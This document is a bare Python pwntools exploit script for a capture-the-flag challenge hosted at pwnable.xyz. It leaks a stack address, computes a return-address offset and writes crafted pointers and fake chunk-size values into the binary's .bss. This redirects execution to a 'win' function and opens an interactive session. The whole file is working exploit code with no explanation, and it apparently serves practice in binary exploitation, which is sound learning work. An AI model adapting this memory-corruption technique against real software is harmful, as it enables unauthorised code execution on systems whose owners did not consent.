#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30005)
#gdb.attach(p)
elf = ELF("./challenge")
win = elf.symbols['win']
bss = elf.bss()

p.sendafter("> ", '2')
buf = int(p.recvuntil("\n"), 16)
ret = buf + 0x58

p.sendafter("> ", '1')
p.sendline('A'*0x8 + p64(ret))
p.sendafter("> ", '3')

p.sendafter("> ", '1')
p.sendline(p64(win) + p64(bss+0x8))
p.sendafter("> ", '3')

p.sendafter("> ", '1')
p.sendline(p64(0x51) + p64(bss+0x58))
p.sendafter("> ", '3')

p.sendafter("> ", '1')
p.sendline(p64(0x21) + p64(bss+0x10))
p.sendafter("> ", '3')

p.sendafter("> ", 'a')

p.interactive()
